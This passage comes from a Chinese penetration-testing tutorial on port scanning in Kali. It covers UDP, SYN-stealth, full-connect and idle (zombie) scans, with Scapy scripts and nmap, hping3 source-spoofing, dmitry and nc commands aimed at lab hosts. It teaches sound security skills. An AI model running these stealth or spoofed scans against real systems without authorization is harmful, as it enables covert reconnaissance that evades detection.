src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221211215325919.png" alt="image-20221211215325919"></li><li><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221211215341440.png" alt="image-20221211215341440"></li></ul></li><li><p>与三层相同的技术</p></li><li><p>存在误判</p><ul><li>69、70等端口同样没有回包，但端口未开放<ul><li><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221211215441399.png" alt="image-20221211215441399"></li></ul></li></ul></li><li><p>UDP_Scan扫描脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> logginglogging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">"scapy.runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>ERROR<span class="token punctuation">)</span><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">import</span> time<span class="token keyword">import</span> sys<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span> sys<span class="token punctuation">.</span>argv <span class="token punctuation">)</span> <span class="token operator">!=</span><span class="token number">4</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"Usage - ./udp_scan.py [Target.IP] [First Port] [Last Port]"</span><span class="token punctuation">)</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"Example - ./udp_scan.py 1.1.1.1 1 100"</span><span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Example will UDP port scan ports 1 through 100 on 1.1.1.1"</span><span class="token punctuation">)</span>   sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>ip<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>start<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>end<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> port <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span>end<span class="token punctuation">)</span><span class="token punctuation">:</span>  a<span class="token operator">=</span>sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>ip<span class="token punctuation">)</span><span class="token operator">/</span>UDP<span class="token punctuation">(</span>dport<span class="token operator">=</span>port<span class="token punctuation">)</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>  time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>       <span class="token comment"># 防止扫描过快</span>  <span class="token keyword">if</span> a<span class="token operator">==</span><span class="token boolean">None</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>     <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="Nmap—UDP"><a href="#Nmap—UDP" class="headerlink" title="Nmap—UDP"></a>Nmap—UDP</h3><ul><li><p>nmap -sU 1.1.1.1</p><ul><li>默认有1000个常用端口<ul><li>按下<code>回车</code>可以查看扫描进度，状态以及时间</li><li><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221211220550156.png" alt="image-20221211220550156"></li></ul></li><li>ICMP host-unreachable</li></ul></li><li><p>nmap -sU 1.1.1.1 -p53&#x2F;161</p><ul><li>指定端口扫描<ul><li><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221211220249003.png" alt="image-20221211220249003"></li></ul></li><li>nmap -sU 1.1.1.1 -p-          # <code>-</code>直接就表示1-65535个端口，全部扫描</li></ul></li></ul><h2 id="端口扫描—TCP"><a href="#端口扫描—TCP" class="headerlink" title="端口扫描—TCP"></a>端口扫描—TCP</h2><blockquote><p>TCP端口扫描</p><ul><li>基于连接的协议</li><li>三次握手</li><li>隐蔽扫描<ul><li>扫描会产生大量流量，防止被入侵检测设备探测到，使用隐蔽扫描</li></ul></li><li>僵尸扫描<ul><li>比隐蔽扫描更加隐蔽</li></ul></li><li>全连接扫描<ul><li>建立完整连接进行扫描，不够隐蔽，容易被发现</li></ul></li><li>所有的TCP扫描方式都是基于三次握手的变化来判断目标端口状态</li></ul></blockquote><ul><li><p>隐蔽扫描—syn</p></li><li><blockquote><p>只发syn包，若是端口开放，会收到ack包；若是端口未开放，会收到rst包；最后一个三次握手的ack包，扫描发起方就不会发送，这样就没有建立完整的TCP连接，目标系统的应用层日志中没有任何记录，但是网络层会有一些痕迹。这中扫描比较隐蔽</p></blockquote><ul><li>不建立完整连接</li><li>应用日志不记录扫描行为—隐蔽</li></ul></li><li><p>僵尸扫描</p></li><li><blockquote><p>扫描发起方和被扫描目标系统之间的网络必须是可以实现地址伪造，</p></blockquote><ul><li><p>极度隐蔽</p></li><li><p>实施条件苛刻</p></li><li><p>可伪造源地址</p></li><li><p>选择僵尸机</p><ul><li>闲置系统：一个足够闲置 ，并且不和除了我们之外的任何其他机器进行网络通信的主机</li><li>系统使用递增的IPID：IPID必须是递增的，<code>0</code>和<code>随机</code>都不可以。然而现在大部分主流的OS的IPID都是随机产生的，但是早期的xp，比如xp200，xp2003都是递增的IPID。</li></ul></li><li><p><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/20210206152545994.jpeg" alt="img"></p><blockquote><p>僵尸扫描一共有三方，扫描者，僵尸机，被扫服务器</p><p>实现过程：</p><ul><li>第一步：扫描发起者向僵尸机发送一个SYN+ACK的数据包(发送之前未建立连接，直接发送SYN+ACK)，正常情况下僵尸机会返回一个RST包，这个RST包中会有IPID字段，假设IPID字段值为x，扫描这就会收到x</li><li>第二步：扫描者向目标服务器发送SYN包，这个包需要伪造源地址；扫描者就将数据包的源IP伪造成僵尸机的IP，此时被扫的服务器收到数据包IP是僵尸机的IP，实际上是扫描者伪造源地址发送的；若目标服务器收到SYN包，且端口是开放的状态，目标服务器就会向僵尸机发送一个SYN+ACK的包；此时，僵尸机又收到一个目标服务器发送的SYN+ACK的包，同样也是未建立连接的SYN+ACK包，僵尸机就会向目标服务器发送一个RST包，这个RST包是继上次给扫描者发送的RST包的第二个RST包，此时的IPID就是x+1；（僵尸机必须足够闲置，从未有过IP通信，否则无法实现僵尸扫描）目标服务器就会收到这个IPIP&#x3D;x+1的包，这个过程中扫描者完全隐蔽</li><li>第三步：扫描者再向僵尸机发送一个SYN+ACK的包，僵尸机又给扫描者发送第三个RST包，此时的IPID&#x3D;x+2；如果这时扫描者收到的IPID值为x+2，那么扫描者就可以判断目标服务器的目标端口就是开放的状态</li></ul></blockquote></li><li><p><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/20210206154946606.jpeg" alt="img"></p><blockquote><p>假设端口是未开放状态，</p><ul><li>第一步：同上</li><li>第二步：同样伪造僵尸机IP给目标服务器发SYN包，由于端口未开放，目标服务器就会给僵尸机发送一个RST包，僵尸机收到RST包后不会给目标服务器返回任何数据包</li><li>第三步：扫描者再次向僵尸机发送一个SYN+ACK包，此时扫描者收到的IPID值为x+1，就表示第二步通信过程中目标服务器没有给僵尸机发送SYN+ACK包，僵尸机也没有给目标服务器发送RST包，</li></ul></blockquote></li></ul></li></ul><h3 id="隐蔽端口扫描"><a href="#隐蔽端口扫描" class="headerlink" title="隐蔽端口扫描"></a>隐蔽端口扫描</h3><blockquote><p>Scaner发送syn—Target接收syn&#x2F;ack—Scaner返回rst  </p><p>建立不完整连接</p></blockquote><h4 id="Scapy"><a href="#Scapy" class="headerlink" title="Scapy"></a>Scapy</h4><ul><li><p>对目标机发送<code>SYN</code>包</p><ul><li><p>a&#x3D;sr1(IP(dst&#x3D;”192.168.216.167”)&#x2F;TCP(flags&#x3D;”S”),timeout&#x3D;1, verbose&#x3D;0)</p><ul><li><p><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212103615797.png" alt="image-20221212103615797"></p></li><li><blockquote><p>目标系统返回<code>flags=SA</code>，表示返回一个<code>SYN/ACK</code>包，默认扫描到端口80开放</p></blockquote></li><li><p><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212103740594.png" alt="image-20221212103740594"></p></li><li><blockquote><p>第一个包是扫描者向目标系统发送一个SYN包，目标系统接收到SYN包之后响应SYN&#x2F;ACK包，第三个包不是scapy给目标系统返回的RST包，而是由于操作系统内核产生，在操作系统内核看来SYN&#x2F;ACK包是一个无来由不正常的包，会自行产生一个RST包。</p></blockquote></li></ul></li></ul></li><li><p>扫描不开放的端口</p><ul><li><p>a&#x3D;sr1(IP(dst&#x3D;”192.168.216.167”)&#x2F;TCP(flags&#x3D;”S”,dport&#x3D;2222),timeout&#x3D;1, verbose&#x3D;0)</p><ul><li><p><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212104923532.png" alt="image-20221212104923532"></p></li><li><p><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212104938902.png" alt="image-20221212104938902"></p></li><li><blockquote><p>会受到一个RST&#x2F;ACK的包，表示目标机是存活状态，但端口未开放</p></blockquote></li></ul></li></ul></li><li><p>使用脚本扫描端口</p><ul><li><p><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212110603235.png" alt="image-20221212110603235"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> logginglogging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">"scapy.runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>ERROR<span class="token punctuation">)</span><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">import</span> time<span class="token keyword">import</span> sys<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span> sys<span class="token punctuation">.</span>argv <span class="token punctuation">)</span> <span class="token operator">!=</span><span class="token number">4</span><span class="token punctuation">:</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Usage - ./udp_scan.py [Target.IP] [First Port] [Last Port]"</span><span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Example - ./udp_scan.py 1.1.1.1 1 100"</span><span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Example will TCP SYN scan ports 1 through 100 on 1.1.1.1"</span><span class="token punctuation">)</span>   sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>ip<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>start<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>end<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> port <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span>end<span class="token punctuation">)</span><span class="token punctuation">:</span>  a<span class="token operator">=</span>sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>ip<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span>port<span class="token punctuation">)</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>  time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>          <span class="token comment">#防止因扫描过快，造成误判</span>  <span class="token keyword">if</span> a<span class="token operator">==</span><span class="token boolean">None</span><span class="token punctuation">:</span>     <span class="token keyword">pass</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>flags<span class="token operator">==</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span>          <span class="token keyword">else</span><span class="token punctuation">:</span>          <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><ul><li><p>nmap -sS 1.1.1.1 -p1-100</p><ul><li><blockquote><p>-sS 进行扫描，使用SYN方式</p></blockquote><ul><li><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212111535477.png" alt="image-20221212111535477"></li></ul></li></ul></li><li><p>只显示<code>open</code>状态的 端口</p><ul><li>nmap -sS 1.1.1.1 -p1-100 –open<ul><li><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212111828321.png" alt="image-20221212111828321"></li></ul></li></ul></li><li><p>端口不连续</p><ul><li><p>nmap -sS 1.1.1.1 -p 80,21,22,25,110,443</p><ul><li><p><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212111932796.png" alt="image-20221212111932796"></p></li><li><blockquote><p>端口状态为filtered表示端口是过滤状态</p></blockquote></li></ul></li></ul></li><li><p>nmap -sS -iL iplist.txt -p 80,21,110,443</p><blockquote><ul><li>可以使用地址列表进行扫描</li></ul></blockquote></li></ul><h4 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h4><ul><li><p>hping3 1.1.1.1 –scan 80 -S</p><ul><li><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212112726416.png" alt="image-20221212112726416"></li><li>可加<code>-V</code>参数进行全端口显示<ul><li><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212112815053.png" alt="image-20221212112815053"></li></ul></li></ul></li><li><p>hping3 1.1.1.1 –scan 0-65535 -S</p><ul><li><blockquote><p>全端口扫描</p></blockquote></li></ul></li><li><p>hping3地址欺骗扫描</p><ul><li><p>hping3 -c 10 -S –spoof 192.168.216.170 -p ++1 192.168.216.167 </p></li><li><blockquote><p>hping3先发送10个包，-S表示使用SYN包发送，–spoof表示欺骗，用来伪造源地址，++1表示每次从1号端口开始进行每次+1个端口进行扫描</p></blockquote><ul><li><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212114340118.png" alt="image-20221212114340118"></li><li><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212114352031.png" alt="image-20221212114352031"></li></ul></li><li><blockquote><p>这样伪造源地址的扫描方式，可以进行扫描，但是目标机进行回包的时候是给伪造的地址进行回复的包，因此扫描机不会看到任何回复包。若要查看回复包，需要有权登录伪造地址的主机进行抓包查看扫描结果；若有权控制网络交换机，可以做镜像端口，可以把目标机IP端口的所有流量可以镜像到扫描机，查看分析所有的包，得到扫描结果。</p></blockquote></li></ul></li></ul><h3 id="全连接端口扫描"><a href="#全连接端口扫描" class="headerlink" title="全连接端口扫描"></a>全连接端口扫描</h3><blockquote><p>SYN扫描在某种特别严格的网络服务器下或者防火墙过滤下，极其特殊性的情况下，SYN包扫描无法探测目标端口是否开放，需要使用全连接端口扫描，能够建立三次握手，结果更加准确，但不够隐蔽，容易触动网络层的入侵检测。</p><p>在特殊情况下的才会使用全连接端口扫描</p></blockquote><h4 id="Scapy-1"><a href="#Scapy-1" class="headerlink" title="Scapy"></a>Scapy</h4><blockquote><p>缺点：</p><ul><li>SYN扫描不需要raw packets</li><li>内核认为SYN&#x2F;ACK是非法包，直接发RST中断连接</li><li>全连接扫描对scapy比较困难</li></ul></blockquote><ul><li><p>使用脚本进行全连接扫描</p><ul><li><p><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212121226208.png" alt="image-20221212121226208"></p></li><li><p><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212121238578.png" alt="image-20221212121238578"></p></li><li><blockquote><p>三次握手的包可以发送出去，但并由于系统的原因没有成功的进行三次握手连接：</p><p>第一个SYN包发送给目标机之后会收到SYN+ACK包，之后扫描机会发送给目标机一个RST包，1.166拒绝连接，然后脚本又会发送一个ACK包（强制发送一个ACK包），最后目标系统返回一个RST包。</p><p>此时我们是想要建立连接，那么就需要将第一个RST包解决掉，之后发送的ACK包就合情合理不会收到最后一个RST包，就代表成功建立连接。</p></blockquote></li></ul></li><li><p>通过<code>linux</code>自带的<code>iptables</code>将操作系统内核产生向目标<code>IP</code>发送的<code>RST</code>包进行<code>DROP</code>掉</p><ul><li><blockquote><p>由于iptables工作在操作系统非常底层的位置，它的工作位置是在操作系统内核之前，也就是目标机器返回的包会先经过<code>iptables</code>的过滤，内核出去的包也会经过<code>iptables</code>的过滤</p></blockquote></li><li><p>命令：iptables -A OUTPUT -p tcp –tcp-flags RST RST -d  192.168.216.167 -j DROP</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> logginglogging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">"scapy.runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>ERROR<span class="token punctuation">)</span><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span><span class="token operator">*</span>SYN<span class="token operator">=</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"192.168.216.167"</span><span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">,</span>flags<span class="token operator">=</span><span class="token string">"S"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-- SENT --"</span><span class="token punctuation">)</span>SYN<span class="token punctuation">.</span>display<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n\n-- REVEIED"</span><span class="token punctuation">)</span>response<span class="token operator">=</span>sr1<span class="token punctuation">(</span>SYN<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>response<span class="token punctuation">.</span>display<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>response<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>flags<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">18</span><span class="token punctuation">:</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n\n-- SENT --"</span><span class="token punctuation">)</span>   A<span class="token operator">=</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"192.168.1.167"</span><span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">,</span>flags<span class="token operator">=</span><span class="token string">"A"</span><span class="token punctuation">,</span>ack<span class="token operator">=</span><span class="token punctuation">(</span>response<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>seq<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   A<span class="token punctuation">.</span>display<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n\n-- RECEIVED --"</span><span class="token punctuation">)</span>   response2<span class="token operator">=</span>sr1<span class="token punctuation">(</span>A<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>   response2<span class="token punctuation">.</span>display<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"SYN-ACK not returned"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><ul><li>nmap -sT 1.1.1.1 -p1-100<ul><li><code>-sT</code> 表示全连接的扫描<ul><li><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212170427880.png" alt="image-20221212170427880"></li></ul></li></ul></li></ul><h4 id="dmitry"><a href="#dmitry" class="headerlink" title="dmitry"></a>dmitry</h4><blockquote><ul><li><p>功能简单，但使用简便</p></li><li><p>默认扫描150个最常用的端口</p></li></ul></blockquote><ul><li><p>dmitry -p 1.1.1.1</p><ul><li><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212171012167.png" alt="image-20221212171012167"></li></ul></li><li><p>dmitry -p 1.1.1.1 -o output</p><blockquote><p>将结果输出到一个文本文件中</p></blockquote></li></ul><h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><ul><li><p>nc -nv -w 1 -z 192.168.216.167 1-100</p><ul><li><p><code>n</code>表示数字不做域名解析；<code>v</code>表示详细内容，<code>-w 1</code>表示对目标端口超时时间；<code>-z</code>表示要做扫描</p><ul><li><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212171608723.png" alt="image-20221212171608723"></li></ul></li></ul></li></ul><h2 id="僵尸扫描"><a href="#僵尸扫描" class="headerlink" title="僵尸扫描"></a>僵尸扫描</h2><blockquote><p>僵尸机：win7 192.168.216.157</p><p>目标机：metasploitable2 192.168.216.167</p><p>扫描机：Kali</p></blockquote><h3 id="Scapy—zombie-py"><a href="#Scapy—zombie-py" class="headerlink" title="Scapy—zombie.py"></a>Scapy—zombie.py</h3><ol><li><p>先定义IP和TCP包头：<br><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212173059199.png" alt="image-20221212173059199"></p></li><li><p>定义向僵尸机发送的包rz，向目标机发送的包rt：</p><p><img 